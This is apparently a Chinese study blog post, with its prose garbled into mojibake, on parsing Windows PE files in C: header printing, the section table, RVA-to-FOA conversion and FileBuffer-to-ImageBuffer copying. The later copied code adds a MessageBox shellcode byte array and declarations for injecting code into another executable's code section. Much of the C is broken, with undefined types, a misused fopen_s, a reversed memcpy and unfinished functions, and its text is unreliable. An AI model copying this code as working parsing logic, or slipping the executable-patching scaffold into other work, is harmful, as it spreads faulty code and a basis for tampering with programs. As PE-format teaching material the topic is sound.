ç¼–å†™ç¨‹åºè¯»å–ä¸€ä¸ª.exeæ–‡ä»¶ï¼Œè¾“å‡ºæ‰€æœ‰çš„PEå¤´ä¿¡æ¯\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cwindows.h\u003e #define FILEPATH \"C:\\\\Users\\\\Administrator\\\\Desktop\\\\HelloWorld.exe\" LPVOID ReadPEFile(LPSTR lpszFile) { FILE *pFile = NULL; DWORD fileSize = 0; LPVOID pFileBuffer = NULL; size_t n = 0 ; // ä½¿ç”¨ fopen_s æ¥æ‰“å¼€æ–‡ä»¶ if (fopen_s(\u0026pFile, lpszFile, \"rb\") != 0 || pFile == NULL) { return NULL; } fseek(pFile, 0, SEEK_END); fileSize = ftell(pFile); fseek(pFile, 0, SEEK_SET); pFileBuffer = malloc(fileSize); if (!pFileBuffer) { fclose(pFile); return NULL; } // ä½¿ç”¨ size_t ç±»å‹çš„å˜é‡æ¥å­˜å‚¨ fread çš„è¿”å›å€¼ n = fread(pFileBuffer, 1, fileSize, pFile); if (n != fileSize) { free(pFileBuffer); fclose(pFile); return NULL; } fclose(pFile); return pFileBuffer; } VOID PrintNTHeaders() { LPVOID pFileBuffer = NULL; PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; pFileBuffer = ReadPEFile(FILEPATH); if (!pFileBuffer) { printf(\"Error reading the file.\\n\"); return; } // æ£€æŸ¥ DOS å¤´ç­¾å if (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { free(pFileBuffer); printf(\"Not a valid PE file (DOS header signature mismatch).\\n\"); return; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; printf(\"DOS Header\\n\"); printf(\"MZ: %X\\n\", pDosHeader-\u003ee_magic); printf(\"PE Offset: %X\\n\", pDosHeader-\u003ee_lfanew); // æ£€æŸ¥ NT å¤´ç­¾å if (*((PDWORD)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE) { free(pFileBuffer); printf(\"Not a valid PE file (NT header signature mismatch).\\n\"); return; } pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDosHeader-\u003ee_lfanew); printf(\"\\n\\nNT Header\\n\"); printf(\"NT Signature: %X\\n\", pNTHeader-\u003eSignature); pPEHeader = \u0026pNTHeader-\u003eFileHeader; // è·å– PE æ–‡ä»¶å¤´ printf(\"\\n\\nPE File Header\\n\"); printf(\"Machine: %X\\n\", pPEHeader-\u003eMachine); printf(\"Number of Sections: %d\\n\", pPEHeader-\u003eNumberOfSections); printf(\"Size of Optional Header: %X\\n\", pPEHeader-\u003eSizeOfOptionalHeader); pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + sizeof(IMAGE_FILE_HEADER)); printf(\"\\n\\nOptional Header\\n\"); printf(\"Magic: %X\\n\", pOptionHeader-\u003eMagic); free(pFileBuffer); // é‡Šæ”¾æ–‡ä»¶ç¼“å†²åŒº } int main() { ReadPEFile(FILEPATH); PrintNTHeaders(); return 0; } ç¼–å†™ç¨‹åºæ‰“å°èŠ‚è¡¨ä¸­çš„ä¿¡æ¯\nåç§»å¦‚ä¸‹ï¼š +-------------------------+ \u003c-- æ–‡ä»¶å¼€å§‹ | IMAGE_DOS_HEADER | +-------------------------+ | Padding (å¯¹é½æ•°æ®) | +-------------------------+ \u003c-- e_lfanew æŒ‡å‘è¿™é‡Œ | IMAGE_NT_HEADERS | \u003c-- pNTHeader | - Signature (4B) | | - IMAGE_FILE_HEADER | | - IMAGE_OPTIONAL_HEADER| +-------------------------+ | IMAGE_SECTION_HEADER | \u003c-- èŠ‚è¡¨å¼€å§‹ | Section[0] | | Section[1] | | ... | +-------------------------+ è¿˜æœ‰å°±æ˜¯ä»pNTHeaderå¼€å§‹æ‰¾IMAGE_SECTION_HEADERçš„è¿‡ç¨‹ï¼Œå…¶ä¸­æ³¨æ„sizeof(IMAGE_OPTIONAL_HEADER)æ˜¯ç¼–è¯‘æ—¶å®šä¹‰çš„å¸¸é‡ï¼Œå°±æ˜¯ç†è®ºå¤§å°;è€ŒpNTHeader-\u003eFileHeader.SizeOfOptionalHeaderè¡¨ç¤ºå®é™…çš„ IMAGE_OPTIONAL_HEADER å¤§å° #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cwindows.h\u003e #define FILEPATH \"C:\\\\Users\\\\Administrator\\\\Desktop\\\\notepad.exe\" LPVOID ReadPEFile(LPSTR lpszFile) { FILE *pFile = NULL; DWORD fileSize = 0; LPVOID pFileBuffer = NULL; size_t n = 0; if (fopen_s(\u0026pFile, lpszFile, \"rb\") != 0 || pFile == NULL) { return NULL; } fseek(pFile, 0, SEEK_END); fileSize = ftell(pFile); fseek(pFile, 0, SEEK_SET); pFileBuffer = malloc(fileSize); if (!pFileBuffer) { fclose(pFile); return NULL; } n = fread(pFileBuffer, 1, fileSize, pFile); if (n != fileSize) { free(pFileBuffer); fclose(pFile); return NULL; } fclose(pFile); return pFileBuffer; } VOID PrintNTSections() { LPVOID pFileBuffer = NULL; PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; int i = 0; char name[9] = {0}; pFileBuffer = ReadPEFile(FILEPATH); if (!pFileBuffer) { printf(\"Error reading the file.\\n\"); return; } if (*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE) { free(pFileBuffer); printf(\"Not a valid PE file (DOS header signature mismatch).\\n\"); return; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if (*((PDWORD)((DWORD_PTR)pFileBuffer + pDosHeader-\u003ee_lfanew)) != IMAGE_NT_SIGNATURE) { free(pFileBuffer); printf(\"Not a valid PE file (NT header signature mismatch).\\n\"); return; } pNTHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pFileBuffer + pDosHeader-\u003ee_lfanew); pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pNTHeader + sizeof(IMAGE_NT_HEADERS) - sizeof(IMAGE_OPTIONAL_HEADER) + pNTHeader-\u003eFileHeader.SizeOfOptionalHeader); printf(\"Section Headers:\\n\"); printf(\"Name\\tVirtual Address\\tSize\\tRaw Data Pointer\\n\"); for (; i \u003c pNTHeader-\u003eFileHeader.NumberOfSections; i++) { strncpy(name, (char *)pSectionHeader[i].Name, 8); printf(\"%s\\t0x%08X\\t0x%08X\\t0x%08X\\n\", name, pSectionHeader[i].VirtualAddress, pSectionHeader[i].Misc.VirtualSize, pSectionHeader[i].PointerToRawData); } free(pFileBuffer); } int main() { PrintNTSections(); return 0; } FileBuffer-ImageBuffer å®ç°å¦‚ä¸‹åŠŸèƒ½:\nç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå°†RVAçš„å€¼è½¬æ¢æˆFOA\n//å‡½æ•°å£°æ˜\t//**************************************************************************\t//ReadPEFile:å°†æ–‡ä»¶è¯»å–åˆ°ç¼“å†²åŒº\t//å‚æ•°è¯´æ˜ï¼š\t//lpszFile æ–‡ä»¶è·¯å¾„\t//pFileBuffer ç¼“å†²åŒºæŒ‡é’ˆ\t//è¿”å›å€¼è¯´æ˜ï¼š\t//è¯»å–å¤±è´¥è¿”å›0 å¦åˆ™è¿”å›å®é™…è¯»å–çš„å¤§å°\t//**************************************************************************\tDWORD ReadPEFile(IN LPSTR lpszFile,OUT LPVOID* pFileBuffer);\t{ FILE *pFile = NULL; DWORD fileSize = 0; size_t n = 0; if (fopen_s(\u0026pFile, lpszFile, \"rb\") != 0 || pFile == NULL) { return NULL; } fseek(pFile, 0, SEEK_END); fileSize = ftell(pFile); fseek(pFile, 0, SEEK_SET); pFileBuffer = malloc(fileSize); if (!pFileBuffer) { fclose(pFile); return NULL; } n = fread(pFileBuffer, 1, fileSize, pFile); if (n != fileSize) { free(pFileBuffer); fclose(pFile); return NULL; } fclose(pFile); return fileSize; } //**************************************************************************\t//CopyFileBufferToImageBuffer:å°†æ–‡ä»¶ä»FileBufferå¤åˆ¶åˆ°ImageBuffer\t//å‚æ•°è¯´æ˜ï¼š\t//pFileBuffer FileBufferæŒ‡é’ˆ\t//pImageBuffer ImageBufferæŒ‡é’ˆ\t//è¿”å›å€¼è¯´æ˜ï¼š\t//è¯»å–å¤±è´¥è¿”å›0 å¦åˆ™è¿”å›å¤åˆ¶çš„å¤§å°\t//**************************************************************************\tDWORD CopyFileBufferToImageBuffer(IN LPVOID pFileBuffer,OUT LPVOID* pImageBuffer);\t{ PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; int i = 1; if (pFileBuffer == NULL || pImageBuffer == NULL) { return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew); pPEHeader = \u0026pNTHeader-\u003eFileHeader; pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)\u0026pNTHeader-\u003eOptionalHeader; pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pNTHeader + sizeof(IMAGE_NT_HEADERS)); *pImageBuffer = malloc(pOptionHeader -\u003e SizeOfImage); if (*pImageBuffer == NULL) { return 0; } memcpy(*pImageBuffer, pFileBuffer, pOptionHeader -\u003e SizeOfImage); for(;i\u003cpFileHeader-\u003eNumberOfSections;i++,pSectionHeader++) { memcpy((LPVOID)((DWORD)*ppImageBuffer+pSectionHeader-\u003eVirtualAddress),(LPVOID)((DWORD)pFileBuffer+pSectionHeader-\u003ePointerToRawData),pSectionHeader-\u003eSizeOfRawData); } return pOptionHeader -\u003e SizeOfImage; } //**************************************************************************\t//CopyImageBufferToNewBuffer:å°†ImageBufferä¸­çš„æ•°æ®å¤åˆ¶åˆ°æ–°çš„ç¼“å†²åŒº\t//å‚æ•°è¯´æ˜ï¼š\t//pImageBuffer ImageBufferæŒ‡é’ˆ\t//pNewBuffer NewBufferæŒ‡é’ˆ\t//è¿”å›å€¼è¯´æ˜ï¼š\t//è¯»å–å¤±è´¥è¿”å›0 å¦åˆ™è¿”å›å¤åˆ¶çš„å¤§å°\t//**************************************************************************\tDWORD CopyImageBufferToNewBuffer(IN LPVOID pImageBuffer,OUT LPVOID* pNewBuffer); { PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; int i = 0; if(!pImageBuffer) { return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew); pPEHeader = \u0026pNTHeader-\u003eFileHeader; pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)\u0026pNTHeader-\u003eOptionalHeader; pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pNTHeader + sizeof(IMAGE_NT_HEADERS)); memcpy(*pImageBuffer, pNewBuffer, pOptionHeader -\u003e SizeOfImage); for(;i\u003cpFileHeader-\u003eNumberOfSections;i++,pSectionHeader++) { memcpy((LPVOID)((DWORD)*ppImageBuffer+pSectionHeader-\u003eVirtualAddress),(LPVOID)((DWORD)pNewBuffer+pSectionHeader-\u003ePointerToRawData),pSectionHeader-\u003eSizeOfRawData); } return pOptionHeader -\u003e SizeOfImage; } //**************************************************************************\t//MemeryTOFile:å°†å†…å­˜ä¸­çš„æ•°æ®å¤åˆ¶åˆ°æ–‡ä»¶\t//å‚æ•°è¯´æ˜ï¼š\t//pMemBuffer å†…å­˜ä¸­æ•°æ®çš„æŒ‡é’ˆ\t//size è¦å¤åˆ¶çš„å¤§å°\t//lpszFile è¦å­˜å‚¨çš„æ–‡ä»¶è·¯å¾„\t//è¿”å›å€¼è¯´æ˜ï¼š\t//è¯»å–å¤±è´¥è¿”å›0 å¦åˆ™è¿”å›å¤åˆ¶çš„å¤§å°\t//**************************************************************************\tBOOL MemeryTOFile(IN LPVOID pMemBuffer,IN size_t size,OUT LPSTR lpszFile); { FILE *pFile = NULL; FILE* fpw = fopen_s(\u0026pFile, lpszFile, \"rb\"); if(!fpw) { return 0; } if (fwrite(pMemBuffer, 1, size, fpw) == 0) { return 0; } fclose(fpw);\tfpw = NULL; return size; } //**************************************************************************\t//RvaToFileOffset:å°†å†…å­˜åç§»è½¬æ¢ä¸ºæ–‡ä»¶åç§»\t//å‚æ•°è¯´æ˜ï¼š\t//pFileBuffer FileBufferæŒ‡é’ˆ\t//dwRva RVAçš„å€¼\t//è¿”å›å€¼è¯´æ˜ï¼š\t//è¿”å›è½¬æ¢åçš„FOAçš„å€¼ å¦‚æœå¤±è´¥è¿”å›0\t//**************************************************************************\tDWORD RvaToFileOffset(IN LPVOID pFileBuffer,IN DWORD dwRva); { PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; DWORD sectionCount = NULL; DWORD dwFoa = 0; int i = 0; if (pFileBuffer == NULL) { return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDosHeader-\u003ee_lfanew); pPEHeader = \u0026pNTHeader-\u003eFileHeader; pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)\u0026pNTHeader-\u003eOptionalHeader; pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)pNTHeader + sizeof(IMAGE_NT_HEADERS)); sectionCount = pNtHeaders-\u003eFileHeader.NumberOfSections; for(;i \u003c sectionCount;i++) { if(dwRva \u003e= pSectionHeader[i].VirtualAddress \u0026\u0026 dwRva \u003c pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData) { dwFoa = dwRva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData; return dwFoa; } } return 0; } è‡ªå·±ä¸ä¼šå†™ï¼ŒæŠŠå¤§ä½¬çš„å…¨éƒ¨æŠ„äº†ä¸€éï¼ˆè‡ªå·±çœŸçš„å†™ä¸å‡ºæ¥ğŸ˜­ï¼‰\n// globlepdd.h: interface for the globlepdd class. // ////////////////////////////////////////////////////////////////////// #if !defined(AFX_GLOBLEPDD_H__DDA6AB97_A94D_41F9_B3B9_8426B6CB7934__INCLUDED_) #define AFX_GLOBLEPDD_H__DDA6AB97_A94D_41F9_B3B9_8426B6CB7934__INCLUDED_ #if _MSC_VER \u003e 1000 #pragma once #endif // _MSC_VER \u003e 1000 #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e //#define FILEPATH_IN \"C:\\\\WINDOWS\\\\system32\\\\kernel32.dll\" //#define FilePath_In \"C:\\\\Windows\\\\notepad.exe\" #define FilePath_In \"C:\\\\Windows\\\\Input.exe\" //#define FilePath_Out \"C:\\\\Windows\\\\notepadnewpes.exe\" #define FilePath_Out \"C:\\\\Windows\\\\Out.exe\" #define MESSAGEBOXADDR 0x77D5050B #define SHELLCODELENGTH 0x12 //16è¿›åˆ¶çš„ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶å°±æ˜¯18 extern BYTE ShellCode[]; DWORD ReadPEFile(IN LPSTR lpszFile,OUT LPVOID* pFileBuffer); DWORD CopyFileBufferToImageBuffer(IN LPVOID pFileBuffer,OUT LPVOID* pImageBuffer); DWORD CopyImageBufferToNewBuffer(IN LPVOID pImageBuffer,OUT LPVOID* pNewBuffer); BOOL MemeryTOFile(IN LPVOID pMemBuffer,IN size_t size,OUT LPSTR lpszFile); //DWORD RvaToFileOffset(IN LPVOID pFileBuffer,IN DWORD dwRva); VOID AddCodeInCodeSec(); #endif // !defined(AFX_GLOBLEPDD_H__DDA6AB97_A94D_41F9_B3B9_8426B6CB7934__INCLUDED_) // globlepdd.cpp: implementation of the globlepdd class. // ////////////////////////////////////////////////////////////////////// #include \"stdafx.h\" #include \"globlepdd.h\" #include \u003cstring.h\u003e #include \u003cwindows.h\u003e #include \u003cstdlib.h\u003e ////////////////////////////////////////////////////////////////////// // Construction/Destruction ////////////////////////////////////////////////////////////////////// BYTE ShellCode[] = { 0x6A,00,0x6A,00,0x6A,00,0x6A,00, //push 0 0xE8,00,00,00,00, // call 0xE9,00,00,00,00 // jmp }; DWORD ReadPEFile(IN LPSTR lpszFile, OUT LPVOID* pFileBuffer) { FILE* pFile = NULL; DWORD fileSize = 0; LPVOID pTempFileBuffer = NULL; //open pFile = fopen(lpszFile,\"rb\"); if(!pFile) { return 0; } //size fseek(pFile,0,SEEK_END); fileSize = ftell(pFile); fseek(pFile,0,SEEK_SET); //malloc pTempFileBuffer = malloc(fileSize); if(!pTempFileBuffer) { fclose(pFile); return 0; } //read memory size_t n = fread(pTempFileBuffer,fileSize,1,pFile); if(!n) { free(pTempFileBuffer); fclose(pFile); return 0; } //succeed close file *pFileBuffer = pTempFileBuffer; pTempFileBuffer = NULL; fclose(pFile); return fileSize; } DWORD CopyFileBufferToImageBuffer(IN LPVOID pFileBuffer,OUT LPVOID* pImageBuffer) { PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTIOM_HEADER pSectionHeader = NULL; LPVOID pTempImageBuffer = NULL; if(pFileBuffer == NULL) { return 0; } if(*((PWORD)pFileBuffer)!= IMAGE_DOS_SIGNATURE) { return 0; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; if(*((PDWORD)((DOWRD)pFileBuffer+pDosHeader -\u003e e_lfanew)) != IMAGE_NT_SIGNATURE) { return 0; } //NT pNTHeader = (PIMAGE_NT_HEADER)((DWORD)pFileBuffer+pDosHeader -\u003e e_lfanew); //PE pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader)+4); //OPT PE pOptionHeader = (PIMAGE_OPTION_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER); //SEC HEADER pSectionHeader = (PIMAGE_SECTIOM_HEADER)((DWORD)pOptionHeader + pPEHeader-\u003eSizeOfOptionalHeader); pTempImageBuffer = malloc(pOptionHeader-\u003eSizeOfImage); if (!pTempImageBuffer) { return 0; } memset(pTempImageBuffer,0,pOptionHeader-\u003eSizeOfImage); memcpy(pTempImageBuffer,pDosHeader,pOptionHeader-\u003eSizeOfheHeaders); PIMAGE_SECTION_HEADER pTempSectionHeader = pSectionHeader; for(int i=0;i\u003cpPEHeader-\u003eNumberOfSections;i++,pTempSectionHeader++) { memcpy((void*)((DWORD)pTempImageBuffer+pTempSectionHeader-\u003eVirtualAddress),(void*)((DWORD)pFileBuffer+pTempSectionHeader-\u003ePointerToRawData),pTempSectionHeader-\u003eSizeOfRawData); } *pImageBuffer=pTempImageBuffer; pTempImageBuffer=NULL; return pOptionHeader-\u003eSizeOfImage; } BOOL MemeryTOFile(IN LPVOID pMemBuffer,IN size_t size,OUT LPSTR lpszFile) { FILE* fp = NULL; fp = fopen(lpFile,\"wb+\"); if(!fp) { return FALSE; } fwrite(pMemBuffer,size,1,fp); fclose(fp); fp = NULL; return TRUE; } DWORD RvaToFileOffset(IN LPVOID pFileBuffer,IN DWORD dwRva) { DWORD dwFOAValue = 0; PIMAGE_DOS_HEADER pDosHeader = NULL; PIMAGE_NT_HEADERS pNTHeader = NULL; PIMAGE_FILE_HEADER pPEHeader = NULL; PIMAGE_OPTIONAL_HEADER32 pOptionHeader = NULL; PIMAGE_SECTION_HEADER pSectionHeader = NULL; if(!pFileBuffer) { return dwFOValue; } if(*((PWORD)pFileBuffer)!=IMAGE_DOS_SIGNATURE) { return dwFOValue; } pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer; pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer+pDosHeader-\u003ee_lfanew); pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNTHeader) + 4); pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader+IMAGE_SIZEOF_FILE_HEADER); return 0; } è§£é‡Šï¼š\nfseeké€šè¿‡ä½¿ç”¨äºŒè¿›åˆ¶çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œç§»åŠ¨æ–‡ä»¶è¯»å†™æŒ‡é’ˆçš„ä½ç½®ï¼Œåœ¨stdio.hå¤´æ–‡ä»¶é‡Œ\nint fseek(FILE * stream, long offset, int fromwhere);\nä¸Šé¢æ˜¯fseekçš„å‡½æ•°åŸå‹ ç¬¬ä¸€ä¸ªå‚æ•°streamä¸ºæ–‡ä»¶æŒ‡é’ˆ ç¬¬äºŒä¸ªå‚æ•°offsetä¸ºåç§»é‡ï¼Œæ•´æ•°è¡¨ç¤ºæ­£å‘åç§»ï¼Œè´Ÿæ•°è¡¨ç¤ºè´Ÿå‘åç§» ç¬¬ä¸‰ä¸ªå‚æ•°fromwhereä¸ºæŒ‡é’ˆçš„èµ·å§‹ä½ç½®,è®¾å®šä»æ–‡ä»¶çš„å“ªé‡Œå¼€å§‹åç§»,å¯èƒ½å–å€¼ä¸ºï¼šSEEK_CURï¼ŒSEEK_ENDï¼ŒSEEK_SET SEEK_SET 0 æ–‡ä»¶å¼€å¤´ SEEK_CUR 1 å½“å‰è¯»å†™çš„ä½ç½® SEEK_END 2 æ–‡ä»¶å°¾éƒ¨\nftell()ç”¨äºè¿”å›æ–‡ä»¶å½“å‰æŒ‡é’ˆæŒ‡å‘çš„ä½ç½®ï¼Œä¸fseeké…åˆå¯ä»¥ç®—å‡ºæ–‡ä»¶å…ƒç´ æ•°æ®æ€»æ•°ã€‚\nftell()å‡½æ•°ç”¨æ¥è·å–æ–‡ä»¶è¯»å†™æŒ‡é’ˆçš„å½“å‰ä½ç½®ï¼Œå…¶åŸå‹ä¸ºï¼šlong ftell(FILE * stream); åŒæ ·åœ¨stdio.hå¤´æ–‡ä»¶é‡Œ\nvoid* malloc (size_t size); size_t â€”\u003e typedef unsigned int size_tï¼›æ— ç¬¦å·æ•´å‹åˆ«åæ˜¯size_t void* â€”\u003e å‡½æ•°çš„è¿”å›å€¼ç±»å‹æ˜¯void*ï¼›voidå¹¶ä¸æ˜¯è¯´æ²¡æœ‰è¿”å›å€¼æˆ–è€…è¿”å›ç©ºæŒ‡é’ˆï¼Œè€Œæ˜¯è¿”å›çš„æŒ‡é’ˆç±»å‹æœªçŸ¥; æ‰€ä»¥åœ¨ä½¿ç”¨malloc()æ—¶é€šå¸¸éœ€è¦è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå°† void æŒ‡é’ˆè½¬æ¢æˆæˆ‘ä»¬å¸Œæœ›çš„ç±»å‹; ä¾‹å¦‚ï¼šchar *ptr = (char *)malloc(10); //åˆ†é…10ä¸ªå­—èŠ‚çš„å†…å­˜ç©ºé—´ï¼Œç”¨æ¥å­˜æ”¾å­—ç¬¦ å‚æ•°è¯´æ˜ â€”\u003e size ä¸ºéœ€è¦åˆ†é…çš„å†…å­˜ç©ºé—´çš„å¤§å°ï¼Œä»¥å­—èŠ‚ï¼ˆByteï¼‰è®¡ã€‚ å‡½æ•°è¯´æ˜ â€”\u003e malloc()åœ¨å †åŒºåˆ†é…ä¸€å—æŒ‡å®šå¤§å°çš„å†…å­˜ç©ºé—´ï¼Œç”¨æ¥å­˜æ”¾æ•°æ®ã€‚è¿™å—å†…å­˜ç©ºé—´åœ¨å‡½æ•°æ‰§è¡Œå®Œæˆåä¸ä¼šè¢«åˆå§‹åŒ–; å®ƒä»¬çš„å€¼æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥åˆ†é…å®Œæˆå†…å­˜ä¹‹åéœ€è¦åˆå§‹åŒ–ï¼› è¿”å›å€¼:åˆ†é…æˆåŠŸè¿”å›æŒ‡å‘è¯¥å†…å­˜çš„åœ°å€ï¼Œå¤±è´¥åˆ™è¿”å›NULLã€‚\nLPVOID â€”-\u003e typedef void far *LPVOIDï¼›åœ¨WINDEF.Hå¤´æ–‡ä»¶é‡Œé¢ï¼›åˆ«åçš„voidæŒ‡é’ˆç±»å‹\nPIMAGE_DOS_HEADER â€”\u003e æŒ‡å‘ç»“æ„ä½“ï¼Œåˆ«åä¸ºè¿™ä¸¤ä¸ªIMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER PIMAGE_NT_HEADERS â€”\u003e æŒ‡å‘ç»“æ„ä½“ï¼Œtypedef PIMAGE_NT_HEADERS32 PIMAGE_NT_HEADERS; PIMAGE_FILE_HEADER â€”\u003e æŒ‡å‘ç»“æ„ä½“ï¼Œåˆ«åä¸ºè¿™ä¸¤ä¸ªIMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; PIMAGE_OPTIONAL_HEADER32 â€”\u003e æŒ‡å‘ç»“æ„ä½“ï¼Œåˆ«åä¸ºè¿™ä¸¤ä¸ª IMAGE_OPTIONAL_HEADER32ï¼Œ*PIMAGE_OPTIONAL_HEADER32; PIMAGE_SECTION_HEADER â€”\u003e æŒ‡å‘ç»“æ„ä½“ï¼Œåˆ«åä¸ºè¿™ä¸¤ä¸ªIMAGE_SECTION_HEADERï¼Œ*PIMAGE_SECTION_HEADER;\nIMAGE_DOS_SIGNATUREè¿™ä¸ªåœ¨å¤´æ–‡ä»¶WINNT.Hé‡Œé¢ï¼Œå¯¹åº”æ˜¯ä¸ªæ— å‚æ•°å®ï¼› #define IMAGE_DOS_SIGNATURE 0x5A4D // MZ åœ¨å®æ‰©å±•çš„æ—¶å€™å°±ä¼šæ›¿æ¢ä¸º0x5A4Dï¼Œç„¶åæ ¹æ®æ¶æ„çš„ä¸åŒè¿›è¡Œæ’åºå­˜å‚¨ï¼Œåˆ†å¤§ç«¯å’Œå°ç«¯æ¨¡å¼ï¼› ä½¿ç”¨ä¸Šé¢æ–¹å¼è¿›è¡Œæ¯”å¯¹æ˜¯å¦æ˜¯æœ‰æ•ˆçš„MZå¤´æ˜¯éå¸¸æœ‰æ•ˆï¼› è€Œä¸”IMAGE_DOS_SIGNATUREå­˜å‚¨çš„å€¼æ˜¯ä¸¤ä¸ªå­—èŠ‚ï¼Œåˆšå¥½å°±æ˜¯PWORD â€”\u003e typedef WORD near *PWORDï¼› æ‰€ä»¥åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºç›¸åŒçš„ç±»å‹è¿›è¡Œæ¯”è¾ƒ\nIMAGE_NT_SIGNATURE â€”\u003e #define IMAGE_NT_SIGNATURE 0x00004550 // PE00 ä¸Šè¿°åŒæ ·æ˜¯ä¸ªå®æ‰©å±•ï¼Œåœ¨å¤´æ–‡ä»¶WINNT.Hé‡Œé¢ï¼› åœ¨è¿›è¡Œæ¯”å¯¹çš„æ—¶å€™å› ä¸ºåœ¨Doså¤´é‡Œé¢æœ‰ä¸ªå€¼æ˜¯e_lfanewå¯¹åº”çš„æ—¶å€™DWORDç±»å‹ï¼Œæ‰€ä»¥åœ¨è¿›è¡ŒæŒ‡é’ˆç›¸åŠ çš„æ—¶å€™ éœ€è¦å…ˆè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œç„¶åç›¸åŠ ï¼Œå³ç§»åŠ¨æŒ‡é’ˆä½ç½®ï¼›ç„¶åæœ€ç»ˆéœ€è¦æ¯”å¯¹çš„ç»“æœæ˜¯0x4550ç«™ä¸¤ä¸ªå­—èŠ‚ æ‰€ä»¥åˆè¦å¼ºåˆ¶è½¬æ¢ç±»å‹ä¸ºPWORDï¼›\nIMAGE_SIZEOF_FILE_HEADERä¹Ÿæ˜¯ä¸ªå®æ‰©å±•ï¼Œé‡Œé¢å­—èŠ‚æè¿°äº†PEæ–‡ä»¶å¤´çš„å¤§å°æ˜¯20ä¸ªå­—èŠ‚ï¼› #define IMAGE_SIZEOF_FILE_HEADER 20ï¼Œæ‰€ä»¥åªè¦åœ¨PEæ–‡ä»¶å¤´çš„é¦–åœ°å€åç§»20ä¸ªå­—èŠ‚å³å¯ç§»åŠ¨åˆ°å¯é€‰PEå¤´ï¼› æŒ‡é’ˆç›¸åŠ çš„æ—¶å€™ï¼Œæ­¤å¤„çš„ç±»å‹ä¾ç„¶æ˜¯DWORD\nåˆ°äº†èŠ‚è¡¨çš„é¦–åœ°å€ä½ç½®ä¹‹åï¼Œå› ä¸ºéœ€è¦å°†FileBufferå¤åˆ¶åˆ°ImageBufferï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒèŠ‚è¡¨ä¹‹å‰çš„Doså¤´ï¼ŒNTå¤´ PEæ–‡ä»¶å¤´ï¼Œå¯é€‰PEå¤´ï¼Œå®ƒä»¬çš„å¤§å°éƒ½æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å®šä½å‡ºæ¥ä¹‹åï¼Œåˆ°åé¢çš„æ“ä½œä¸­ç›´æ¥å¤åˆ¶å³å¯ï¼Œè€ŒèŠ‚è¡¨ä¸ä¸€æ · 